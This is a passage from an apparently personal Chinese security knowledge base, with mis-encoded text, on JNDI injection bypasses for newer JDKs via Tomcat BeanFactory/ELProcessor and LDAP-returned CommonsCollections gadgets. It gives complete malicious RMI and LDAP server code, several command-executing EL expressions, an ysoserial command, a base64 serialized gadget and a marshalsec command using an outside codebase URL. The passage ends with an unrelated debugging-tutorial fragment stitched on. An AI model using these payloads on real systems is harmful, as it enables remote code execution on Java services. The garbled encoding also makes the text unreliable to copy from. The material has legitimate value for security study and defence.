å­˜åœ¨äºTomcatä¾èµ–åŒ…ä¸­ï¼Œæ‰€ä»¥ä½¿ç”¨ä¹Ÿæ˜¯éå¸¸å¹¿æ³›ã€‚ è¯¥ç±»åœ¨ getObjectInstance() ä¸­ä¼šé€šè¿‡åå°„çš„æ–¹å¼å®ä¾‹åŒ–Referenceæ‰€æŒ‡å‘çš„ä»»æ„Bean Classï¼Œå¹¶ä¸”ä¼šè°ƒç”¨setteræ–¹æ³•ä¸ºæ‰€æœ‰çš„å±æ€§èµ‹å€¼ã€‚è€Œè¯¥Bean Classçš„ç±»åã€å±æ€§ã€å±æ€§å€¼ï¼Œå…¨éƒ½æ¥è‡ªäºReferenceå¯¹è±¡ï¼Œå‡æ˜¯æ”»å‡»è€…å¯æ§çš„ã€‚ åˆ©ç”¨ä¸¾ä¾‹ æ ¹æ®beanFactoryçš„ä»£ç é€»è¾‘ï¼Œè¦æ±‚ä¼ å…¥çš„Referenceä¸ºResourceRefç±»ï¼Œè¿™ä¸ªæƒ…å†µä¸‹ï¼Œç›®æ ‡Bean Classå¿…é¡»æœ‰ä¸€ä¸ªæ— å‚æ„é€ æ–¹æ³•ï¼Œæœ‰publicçš„setteræ–¹æ³•ä¸”å‚æ•°ä¸ºä¸€ä¸ªStringç±»å‹ã€‚äº‹å®ä¸Šï¼Œè¿™äº›setterä¸ä¸€å®šéœ€è¦æ˜¯set..å¼€å¤´çš„æ–¹æ³•ï¼Œæ ¹æ®org.apache.naming.factory.BeanFactoryä¸­çš„é€»è¾‘ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠæŸä¸ªæ–¹æ³•å¼ºåˆ¶æŒ‡å®šä¸ºsetterã€‚ ç„¶åå¤§ä½¬ä»¬æ‰¾åˆ°äº†javax.el.ELProcessorå¯ä»¥ä½œä¸ºç›®æ ‡Classã€‚ pom.xmlï¼ˆåŒæ–¹å‡éœ€è¦ï¼‰ org.apache.tomcat tomcat-catalina 8.5.0 org.apache.el com.springsource.org.apache.el 7.0.26 Server package org.example; import com.sun.jndi.rmi.registry.ReferenceWrapper; import org.apache.naming.ResourceRef; import javax.naming.NamingException; import javax.naming.StringRefAddr; import java.io.IOException; import java.rmi.AlreadyBoundException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class App { public static void main(String[] args) throws IOException, NamingException, AlreadyBoundException { Registry registry = LocateRegistry.createRegistry(1099); System.out.println(\"RMI LISTEN PORT 1099\"); // å®ä¾‹åŒ–Referenceï¼ŒæŒ‡å®šç›®æ ‡ç±»ä¸ºjavax.el.ELProcessorï¼Œå·¥å‚ç±»ä¸ºorg.apache.naming.factory.BeanFactory ResourceRef ref = new ResourceRef(\"javax.el.ELProcessor\", null, \"\", \"\", true,\"org.apache.naming.factory.BeanFactory\",null); // å¼ºåˆ¶å°† 'x' å±æ€§çš„setter ä» 'setX' å˜ä¸º 'eval', è¯¦ç»†é€»è¾‘è§ BeanFactory.getObjectInstance ä»£ç  ref.add(new StringRefAddr(\"forceString\", \"x=eval\")); // åˆ©ç”¨è¡¨è¾¾å¼æ‰§è¡Œå‘½ä»¤ ref.add(new StringRefAddr(\"x\", \"\\\"\\\".getClass().forName(\\\"javax.script.ScriptEngineManager\\\").newInstance().getEngineByName(\\\"JavaScript\\\").eval(\\\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','/System/Applications/Calculator.app/Contents/MacOS/Calculator']).start()\\\")\")); ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref); registry.bind(\"Exploit\", referenceWrapper); } } Client package org.example; import javax.naming.InitialContext; import javax.naming.NamingException; public class Client { public static void main(String[] args) throws NamingException { //åˆå§‹åŒ–ç¯å¢ƒ InitialContext init = new InitialContext(); // å¯»æ‰¾Exploitï¼Œç„¶åä¼šæ‰§è¡ŒELè¡¨è¾¾å¼ init.lookup(\"rmi://127.0.0.1:1099/Exploit\"); } } å‡ ç§å˜ä½“çš„è¡¨è¾¾å¼ å‰é¢çš„æ¶æ„è¡¨è¾¾å¼å°±æ˜¯é€šè¿‡åå°„çš„æ–¹å¼æ¥å®ç°å‘½ä»¤æ‰§è¡Œçš„ï¼Œæœ¬åœ°æµ‹è¯•æœ‰å¦‚ä¸‹å‡ ç§å˜ä½“ï¼ŒåŸç†éƒ½æ˜¯åŸºäºåå°„è°ƒç”¨ä»»æ„ç±»æ–¹æ³•ï¼š import javax.el.ELProcessor; public class Test { public static void main(String[] args) { String poc = \"''.getClass().forName('javax.script.ScriptEngineManager')\" + \".newInstance().getEngineByName('nashorn')\" + \".eval(\\\"s=[3];s[0]='cmd';s[1]='/C';s[2]='calc';java.lang.Runtime.getRuntime().exec(s);\\\")\"; // String poc = \"''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass())\" + // \".invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime')\" + // \".invoke(null),'calc.exe')}\"; // String poc = \"''.getClass().forName('javax.script.ScriptEngineManager')\" + // \".newInstance().getEngineByName('JavaScript')\" + // \".eval(\\\"java.lang.Runtime.getRuntime().exec('calc')\\\")\"; new ELProcessor().eval(poc); } } Debugåˆ†æ å› ä¸ºorg.apache.naming.factory.BeanFactory ç±»åœ¨ getObjectInstance() ä¸­ä¼šé€šè¿‡åå°„çš„æ–¹å¼å®ä¾‹åŒ–Referenceæ‰€æŒ‡å‘çš„ä»»æ„Bean Classï¼Œå¹¶ä¸”ä¼šè°ƒç”¨setteræ–¹æ³•ä¸ºæ‰€æœ‰çš„å±æ€§èµ‹å€¼ã€‚è€Œè¯¥Bean Classçš„ç±»åã€å±æ€§ã€å±æ€§å€¼ï¼Œå…¨éƒ½æ¥è‡ªäºReferenceå¯¹è±¡ï¼Œå‡æ˜¯æ”»å‡»è€…å¯æ§çš„ã€‚æ‰€ä»¥é‡ç‚¹åˆ†ægetObjectInstance() RegistryContext.lookupå¯¹RMI registryå‘è¯·æ±‚,ååºåˆ—è·å–åˆ°ReferenceWrapper_Stubï¼Œç„¶åæŠŠååºåˆ—å¾—åˆ°çš„ReferenceWrapper_Stubä¼ ç»™decodeObject() è·Ÿè¿›decodeObjectï¼Œé¦–å…ˆç»™è·å–åˆ°çš„var1 ReferenceWrapper_Stubè°ƒç”¨getReference()æ–¹æ³•ï¼ŒgetReferenceæ–¹æ³•é€šè¿‡è·å–ReferenceWrapper_Stubçš„refå±æ€§ç„¶åå‘è¯·æ±‚, ååºåˆ—è¯·æ±‚ç»“æœå¾—åˆ°çœŸæ­£ç»‘å®šåˆ°RMI Registryä¸Šçš„å¯¹è±¡(ResourceRef), ç„¶åä¼ ç»™NamingManager.getObjectInstance()æ–¹æ³•ã€‚ é¦–å…ˆç±»å‹è½¬æ¢å°†objectè½¬æ¢ä¸ºReferenceå¯¹è±¡ ç„¶åref.getFactoryClassName() è·å–FactoryClassNameï¼Œè¿”å›çš„æ˜¯Referenceå¯¹è±¡çš„classFactoryå±æ€§ï¼Œç„¶åä¼ é€’åˆ°getObjectFactoryFromReferenceä¸­ï¼Œç„¶åloadClassåŠ è½½æˆ‘ä»¬ä¼ å…¥çš„org.apache.naming.factory.BeanFactoryç±», å†newInstanceå®ä¾‹åŒ–è¯¥ç±»å¹¶å°†å…¶è½¬æ¢æˆObjectFactoryç±»å‹ã€‚ ç„¶åç›´æ¥è°ƒç”¨ObjectFactoryæ¥å£å®ç°ç±»å®ä¾‹çš„getObjectInstance()å‡½æ•°ï¼Œè¿™é‡Œæ˜¯BeanFactoryç±»å®ä¾‹çš„getObjectInstance()å‡½æ•° è·Ÿè¿›BeanFactory.getObjectInstanceï¼Œä¼šåˆ¤æ–­objå‚æ•°æ˜¯å¦æ˜¯ResourceRefç±»å®ä¾‹ï¼Œæ˜¯çš„è¯ä»£ç æ‰ä¼šå¾€ä¸‹èµ°ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬åœ¨æ¶æ„RMIæœåŠ¡ç«¯ä¸­æ„é€ Referenceç±»å®ä¾‹çš„æ—¶å€™å¿…é¡»è¦ç”¨Referenceç±»çš„å­ç±»ResourceRefç±»æ¥åˆ›å»ºå®ä¾‹ æ¥ç€è·å–Beanç±»ä¸ºjavax.el.ELProcessoråï¼Œå®ä¾‹åŒ–è¯¥ç±»å¹¶è·å–å…¶ä¸­çš„forceStringç±»å‹çš„å†…å®¹ï¼Œå…¶å€¼æ˜¯æˆ‘ä»¬æ„é€ çš„x=evalå†…å®¹ï¼š ç»§ç»­å¾€ä¸‹è°ƒè¯•å¯ä»¥çœ‹åˆ°ï¼ŒæŸ¥æ‰¾forceStringçš„å†…å®¹ä¸­æ˜¯å¦å­˜åœ¨â€=â€å·ï¼Œä¸å­˜åœ¨çš„è¯å°±è°ƒç”¨å±æ€§çš„é»˜è®¤setteræ–¹æ³•ï¼Œå­˜åœ¨çš„è¯å°±å–é”®å€¼ã€å…¶ä¸­é”®æ˜¯å±æ€§åè€Œå¯¹åº”çš„å€¼æ˜¯å…¶æŒ‡å®šçš„setteræ–¹æ³•ã€‚å¦‚æ­¤ï¼Œä¹‹å‰è®¾ç½®çš„forceStringçš„å€¼å°±å¯ä»¥å¼ºåˆ¶å°†xå±æ€§çš„setteræ–¹æ³•è½¬æ¢ä¸ºè°ƒç”¨æˆ‘ä»¬æŒ‡å®šçš„eval()æ–¹æ³•äº†ï¼Œè¿™æ˜¯BeanFactoryç±»èƒ½è¿›è¡Œåˆ©ç”¨çš„å…³é”®ç‚¹ï¼ä¹‹åï¼Œå°±æ˜¯è·å–beanClasså³javax.el.ELProcessorç±»çš„eval()æ–¹æ³•å¹¶å’Œxå±æ€§ä¸€åŒç¼“å­˜åˆ°forcedè¿™ä¸ªHashMapä¸­ æ¥ç€æ˜¯å¤šä¸ªdo whileè¯­å¥æ¥éå†è·å–ResourceRefç±»å®ä¾‹addrå±æ€§çš„å…ƒç´ ï¼Œå½“è·å–åˆ°addrTypeä¸ºxçš„å…ƒç´ æ—¶é€€å‡ºå½“å‰æ‰€æœ‰å¾ªç¯ï¼Œç„¶åè°ƒç”¨getContent()å‡½æ•°æ¥è·å–xå±æ€§å¯¹åº”çš„contentså³æ¶æ„è¡¨è¾¾å¼ã€‚è¿™é‡Œå°±æ˜¯æ¶æ„RMIæœåŠ¡ç«¯ä¸­ResourceRefç±»å®ä¾‹æ·»åŠ çš„ç¬¬äºŒä¸ªå…ƒç´  è·å–åˆ°ç±»å‹ä¸ºxå¯¹åº”çš„å†…å®¹ä¸ºæ¶æ„è¡¨è¾¾å¼åï¼Œä»å‰é¢çš„ç¼“å­˜forcedä¸­å–å‡ºkeyä¸ºxçš„å€¼å³javax.el.ELProcessorç±»çš„eval()æ–¹æ³•å¹¶èµ‹å€¼ç»™methodå˜é‡ï¼Œæœ€åå°±æ˜¯é€šè¿‡method.invoke()å³åå°„è°ƒç”¨çš„æ¥æ‰§è¡Œæ¶æ„çš„ELè¡¨è¾¾å¼ã€‚ æ€»ç»“ è¿™ç§æ–¹æ³•æ˜¯ä»æœ¬åœ°ClassPathä¸­å¯»æ‰¾å¯èƒ½å­˜åœ¨Tomcatç›¸å…³ä¾èµ–åŒ…æ¥è¿›è¡Œè§¦å‘åˆ©ç”¨ï¼Œå·²çŸ¥çš„ç±»æ˜¯org.apache.naming.factory.BeanFactoryï¼› ç”±äºorg.apache.naming.factory.BeanFactoryç±»çš„getObjectInstance()æ–¹æ³•ä¼šåˆ¤æ–­æ˜¯å¦ä¸ºResourceRefç±»å®ä¾‹ï¼Œå› æ­¤åœ¨RMIæœåŠ¡ç«¯ç»‘å®šçš„Referenceç±»å®ä¾‹ä¸­å¿…é¡»ä¸ºReferenceç±»çš„å­ç±»ResourceRefç±»å®ä¾‹ï¼Œè¿™é‡ŒresourceClassé€‰æ‹©çš„ä¹Ÿæ˜¯åœ¨Tomcatç¯å¢ƒä¸­å­˜åœ¨çš„javax.el.ELProcessorç±»ï¼› ResourceRefç±»å®ä¾‹åˆ†åˆ«æ·»åŠ äº†ä¸¤æ¬¡StringRefAddrç±»å®ä¾‹å…ƒç´ ï¼Œç¬¬ä¸€æ¬¡æ˜¯ç±»å‹ä¸ºforceStringã€å†…å®¹ä¸ºx=evalçš„StringRefAddrç±»å®ä¾‹ï¼Œè¿™é‡Œçœ‹org.apache.naming.factory.BeanFactoryç±»çš„getObjectInstance()æ–¹æ³•æºç å‘ç°ï¼Œç¨‹åºä¼šåˆ¤æ–­æ˜¯å¦å­˜åœ¨=å·ï¼Œè‹¥å­˜åœ¨åˆ™å°†xå±æ€§çš„é»˜è®¤setteræ–¹æ³•è®¾ç½®ä¸ºæˆ‘ä»¬evalï¼›ç¬¬äºŒæ¬¡æ˜¯ç±»å‹ä¸ºxã€å†…å®¹ä¸ºæ¶æ„è¡¨è¾¾å¼çš„StringRefAddrç±»å®ä¾‹ï¼Œè¿™é‡Œæ˜¯è·Ÿå‰é¢çš„xå±æ€§å…³è”èµ·æ¥ï¼Œxå±æ€§çš„setteræ–¹æ³•æ˜¯eval()ï¼Œè€Œç°åœ¨å®ƒçš„å†…å®¹ä¸ºæ¶æ„è¡¨è¾¾å¼ï¼Œè¿™æ ·å°±èƒ½ä¸²èµ·æ¥è°ƒç”¨javax.el.ELProcessorç±»çš„eval()å‡½æ•°æ‰§è¡Œæ¶æ„è¡¨è¾¾å¼ä»è€Œè¾¾åˆ°æ”»å‡»åˆ©ç”¨çš„ç›®çš„ ç»•è¿‡é«˜ç‰ˆæœ¬JDKé™åˆ¶ï¼šåˆ©ç”¨LDAPè¿”å›åºåˆ—åŒ–æ•°æ®ï¼Œè§¦å‘æœ¬åœ°Gadget LDAPæœåŠ¡ç«¯é™¤äº†æ”¯æŒJNDI Referenceè¿™ç§åˆ©ç”¨æ–¹å¼å¤–ï¼Œè¿˜æ”¯æŒç›´æ¥è¿”å›ä¸€ä¸ªåºåˆ—åŒ–çš„å¯¹è±¡ã€‚å¦‚æœJavaå¯¹è±¡çš„javaSerializedDataå±æ€§å€¼ä¸ä¸ºç©ºï¼Œåˆ™å®¢æˆ·ç«¯çš„obj.decodeObject()æ–¹æ³•å°±ä¼šå¯¹è¿™ä¸ªå­—æ®µçš„å†…å®¹è¿›è¡Œååºåˆ—åŒ–ã€‚ å¦‚æœæœåŠ¡ç«¯ClassPathä¸­å­˜åœ¨ååºåˆ—åŒ–æ¼æ´å¤šåŠŸèƒ½åˆ©ç”¨Gadgetå¦‚CommonsCollectionsåº“ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç»“åˆè¯¥Gadgetå®ç°ååºåˆ—åŒ–æ¼æ´æ”»å‡»ã€‚ åˆ©ç”¨ä¸¾ä¾‹ ç”ŸæˆPOC å‡è®¾ç›®æ ‡ç³»ç»Ÿä¸­å­˜åœ¨ç€æœ‰æ¼æ´çš„CommonsCollectionsåº“ï¼Œä½¿ç”¨ysoserialç”Ÿæˆä¸€ä¸ªCommonsCollectionsçš„åˆ©ç”¨Payload java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 \"open -na Calculator\" | base64 LDAP Server package org.example; import com.unboundid.ldap.listener.InMemoryDirectoryServer; import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig; import com.unboundid.ldap.listener.InMemoryListenerConfig; import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult; import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor; import com.unboundid.ldap.sdk.Entry; import com.unboundid.ldap.sdk.LDAPException; import com.unboundid.ldap.sdk.LDAPResult; import com.unboundid.ldap.sdk.ResultCode; import com.unboundid.util.Base64; import javax.net.ServerSocketFactory; import javax.net.SocketFactory; import javax.net.ssl.SSLSocketFactory; import java.net.InetAddress; import java.net.MalformedURLException; import java.net.URL; import java.text.ParseException; public class App { private static final String LDAP_BASE = \"dc=example,dc=com\"; public static void main (String[] args) { String url = \"http://127.0.0.1:8888/#Exploit\"; int port = 1389; try { InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE); config.setListenerConfigs(new InMemoryListenerConfig( \"listen\", InetAddress.getByName(\"0.0.0.0\"), port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault())); config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url))); InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config); System.out.println(\"Listening on 0.0.0.0:\" + port); ds.startListening(); } catch ( Exception e ) { e.printStackTrace(); } } private static class OperationInterceptor extends InMemoryOperationInterceptor { private URL codebase; /** * */ public OperationInterceptor ( URL cb ) { this.codebase = cb; } /** * {@inheritDoc} * * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult) */ @Override public void processSearchResult (InMemoryInterceptedSearchResult result ) { String base = result.getRequest().getBaseDN(); Entry e = new Entry(base); try { sendResult(result, base, e); } catch ( Exception e1 ) { e1.printStackTrace(); } } protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException { URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(\".class\")); System.out.println(\"Send LDAP reference result for \" + base + \" redirecting to \" + turl); e.addAttribute(\"javaClassName\", \"Exploit\"); String cbstring = this.codebase.toString(); int refPos = cbstring.indexOf('#'); if ( refPos > 0 ) { cbstring = cbstring.substring(0, refPos); } // Payload1: åˆ©ç”¨LDAP+Reference Factory // e.addAttribute(\"javaCodeBase\", cbstring); // e.addAttribute(\"objectClass\", \"javaNamingReference\"); // e.addAttribute(\"javaFactory\", this.codebase.getRef()); // Payload2: è¿”å›åºåˆ—åŒ–Gadget try { e.addAttribute(\"javaSerializedData\", Base64.decode(\"rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0ABNvcGVuIC1uYSBDYWxjdWxhdG9ydAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg=\")); } catch (ParseException exception) { exception.printStackTrace(); } result.sendSearchEntry(e); result.setResult(new LDAPResult(0, ResultCode.SUCCESS)); } } } Client package org.example; import javax.naming.InitialContext; import javax.naming.NamingException; public class Client { public static void main(String[] args) throws NamingException { //åˆå§‹åŒ–ç¯å¢ƒ InitialContext init = new InitialContext(); init.lookup(\"ldap://127.0.0.1:1389/Exploit\"); } } Debugåˆ†æ è°ƒç”¨æ ˆ å‰é¢çš„å‡½æ•°è°ƒç”¨é“¾éƒ½æ˜¯ä¸åŒç±»lookup()å‡½æ•°ä¹‹é—´çš„è°ƒç”¨ï¼Œcom.sun.jndi.ldap.LdapCtxç±»çš„c_lookup()å‡½æ•°ä¸­ä¼šè°ƒç”¨åˆ°com.sun.jndi.ldap.Objç±»çš„decodeObject()å‡½æ•°è¿›è¡Œè§£ç å¯¹è±¡çš„æ“ä½œã€‚ è·Ÿè¿›å»ï¼Œå…ˆè°ƒç”¨getCodebases()å‡½æ•°ä»JAVA_ATTRIBUTESä¸­å–å‡ºç´¢å¼•ä¸º4å³javaCodeBaseçš„å†…å®¹ï¼Œç”±äºæœ¬æ¬¡å¹¶æ²¡æœ‰è®¾ç½®è¿™ä¸ªå±æ€§å› æ­¤è¿”å›nullå³ä¸‹é¢Variablesæ¡†ä¸­çš„var1(slot_2)å˜é‡ï¼›ç„¶åä»JAVA_ATTRIBUTESä¸­å–å‡ºç´¢å¼•ä¸º1å³javaSerializedDataçš„å†…å®¹ï¼Œè¿™ä¸ªæˆ‘ä»¬æ˜¯åœ¨æ¶æ„LDAPæœåŠ¡ç«¯ä¸­è®¾ç½®äº†çš„ã€å†…å®¹å°±æ˜¯æ¶æ„çš„Commons-Collectionsè¿™ä¸ªGadgetçš„æ¶æ„åˆ©ç”¨åºåˆ—åŒ–å¯¹è±¡å­—èŠ‚æµï¼Œå¯¹åº”çš„æ˜¯ä¸‹é¢Variablesæ¡†ä¸­çš„var2 (slot_1)å˜é‡ï¼›è¿™é‡Œvar1(slot_2)å˜é‡ä¸ºnullï¼Œä¼ å…¥getURLClassLoader()å‡½æ•°è°ƒç”¨åè¿”å›çš„æ˜¯AppClassLoaderå³åº”ç”¨ç±»åŠ è½½å™¨ï¼›å†å¾€ä¸‹å°±æ˜¯è°ƒç”¨deserializeObject()å‡½æ•°æ¥ååºåˆ—åŒ–javaSerializedDataçš„å¯¹è±¡å­—èŠ‚ç  å…¶ä¸­ï¼Œé™æ€å˜é‡JAVA_ATTRIBUTESçš„å†…å®¹å¦‚ä¸‹ï¼š å»ºè®® å®æˆ˜ä¸­å¯ä»¥ä½¿ç”¨marshalsecæ–¹ä¾¿çš„å¯åŠ¨ä¸€ä¸ªLDAP/RMI Ref Serverï¼š java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.jndi.(LDAP|RMI)RefServer # [] Example: java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://8.8.8.8:8090/#Exploit 8088 å‚è€ƒ å…³äº JNDI æ³¨å…¥ JNDIæ³¨å…¥å…¥é—¨ æµ…æJNDIæ³¨å…¥ who is JNDIï¼Ÿ Copyright Â© d4m1ts 2022 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2021-12-25 18:51:59 "},"ä¸ªäººçŸ¥è¯†åº“/02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/1.å®¡è®¡åŸºç¡€/06.IDEAæ–­ç‚¹è°ƒè¯•.html":{"url":"ä¸ªäººçŸ¥è¯†åº“/02.ä»£ç å®¡è®¡/01.Javaå®‰å…¨/1.å®¡è®¡åŸºç¡€/06.IDEAæ–­ç‚¹è°ƒè¯•.html","title":"06.IDEAæ–­ç‚¹è°ƒè¯•","keywords":"","body":"TreeviewCopyright Â© d4m1ts all right reserved, powered by aleen42 å‰è¨€ æ§åˆ¶é¢æ¿ æ–­ç‚¹ ä»€ä¹ˆæ˜¯æ–­ç‚¹ æ–­ç‚¹å‚æ•°ï¼ˆæ–­ç‚¹å±æ€§ï¼‰ æ–­ç‚¹çš„ç§ç±» Line breakpointï¼ˆè¡Œæ–­ç‚¹ï¼‰ Temporary line breakpointï¼ˆä¸´æ—¶è¡Œæ–­ç‚¹ï¼‰ Field watchpointï¼ˆå±æ€§æ–­ç‚¹ï¼‰ Method breakpointï¼ˆæ–¹æ³•æ–­ç‚¹ï¼‰ Exception breakpointï¼ˆå¼‚å¸¸æ–­ç‚¹ï¼‰ æ¡ä»¶æ–­ç‚¹ å‰è¨€ ä»£ç å®¡è®¡è¿‡ç¨‹ä¸­è‚¯å®šæ˜¯éœ€è¦ä¸‹æ–­ç‚¹è®©ç¨‹åºæš‚åœè¿›è¡Œåˆ†æçš„ï¼Œæ‰€ä»¥å¾ˆé‡è¦ï¼ï¼ï¼ è°ƒè¯•æŠ€èƒ½é‡è¦æ€§ç”šâ¾„è¶…è¿‡å­¦ä¹ â¼€é—¨è¯­â¾”:hotsprings: æœ¬æ–‡ä¸»è¦æ˜¯é’ˆå¯¹IDEAè¿›è¡Œæ–­ç‚¹è°ƒè¯•ï¼ŒIDEA YYDS åœ¨è°ƒè¯•ä»£ç çš„æ—¶å€™ï¼Œä½ çš„é¡¹ç›®å¾—debugæ¨¡å¼å¯åŠ¨ï¼Œä¹Ÿå°±æ˜¯ç‚¹é‚£ä¸ªç»¿è‰²çš„ç”²è™«å¯åŠ¨æœåŠ¡å™¨ï¼Œç„¶åï¼Œå°±å¯ä»¥åœ¨ä»£ç é‡Œé¢æ–­ç‚¹è°ƒè¯•å•¦ã€‚ æ§åˆ¶é¢æ¿ å‚è€ƒhttps://blog.csdn.net/f641385712/article/details/93145454 å¤§å¤šæ•°è¯´æ˜å›¾ç‰‡å°±ç›´æ¥Copyè¿‡æ¥çš„ï¼Œä¸è¶³ç‚¹å†æ·»åŠ è¡¥å……è¯´æ˜ è¿›å…¥æ–­ç‚¹ç®¡ç†ç•Œé¢ è¯´æ˜ æ–­ç‚¹ ä»€ä¹ˆæ˜¯æ–­ç‚¹ æ–­ç‚¹ä½ å¯èƒ½å¤©å¤©éƒ½åœ¨ä½¿ç”¨ï¼Œä½†æ˜¯è‹¥çœŸè¦ä½ å¯¹å®ƒä¸‹å®šä¹‰ï¼Œä¼°è®¡ä¸€æ—¶é—´è¿˜æœ‰ç‚¹æ‡µé€¼å‘¢æœ‰æœ¨æœ‰ï¼Ÿ æ–­ç‚¹ï¼šæ˜¯ä¸€ç§é™„åŠ åœ¨æºä»£ç ä¸Šé¢çš„ç‰¹æ®Šæ ‡è®°ï¼Œåœ¨è°ƒè¯•æ¨¡å¼(debugæ¨¡å¼)ä¸‹å¯ä»¥è§¦å‘ç‰¹å®šçš„åŠ¨ä½œï¼Œæ¯”å¦‚æ‰“å°çº¿ç¨‹è°ƒç”¨æ ˆä¿¡æ¯ã€è®¡ç®—å€¼ã€æ‰“å°æŒ‡å®šè¡¨è¾¾å¼çš„å€¼ç­‰ç­‰ã€‚ Tipsï¼šæ–­ç‚¹ä¸€ä½†è®¾ç½®å°±ä¼šä¸€ç›´ä¿å­˜åœ¨å·¥ç¨‹ä¸­ç›´åˆ°æ‰‹åŠ¨åˆ é™¤~ æ–­ç‚¹å‚æ•°ï¼ˆæ–­ç‚¹å±æ€§ï¼‰ æ–­ç‚¹å¹¶ä¸æ˜¯ä»…ä»…æ˜¯å­¤ç«‹çš„å­˜åœ¨çš„ï¼Œå®ƒä¹Ÿå¯ä»¥é€šè¿‡å‚æ•°è¿›è¡Œå®šåˆ¶åŒ–ï¼Œè¿™äº›å«æ–­ç‚¹å‚æ•°ã€‚ ä¸åŒç±»å‹çš„æ–­ç‚¹æ”¯æŒçš„æ–­ç‚¹å‚æ•°ä¹Ÿä¸å°½ç›¸åŒï¼Œåœ¨ä¸‹é¢å…·ä½“ä»‹ç»æ—¶ä¼šè¯¦ç»†è¯´æ˜~ æ–­ç‚¹çš„ç§ç±» æ®æˆ‘ç²—ç•¥è°ƒæŸ¥ï¼Œ80%çš„å°ä¼™ä¼´æ‰“æ–­ç‚¹åªä¼šé‡‡ç”¨ä»£ç è¡Œå·¦è¾¹é¼ æ ‡å•å‡»è¿™ç§æœ€åŸºç¡€çš„æ–¹å¼æ‰“æ–­ç‚¹ç„¶åè°ƒè¯•ã€‚å…¶å®åœ¨ç°å®åœºæ™¯ä¸­ï¼Œæœ‰éå¸¸éå¸¸å¤šçš„æƒ…å†µä¸‹ï¼Œè¿™ç§æ–¹å¼å°†å¾ˆéš¾å¿«é€Ÿå®šä½åˆ°é—®é¢˜æ‰€åœ¨ï¼Œå› 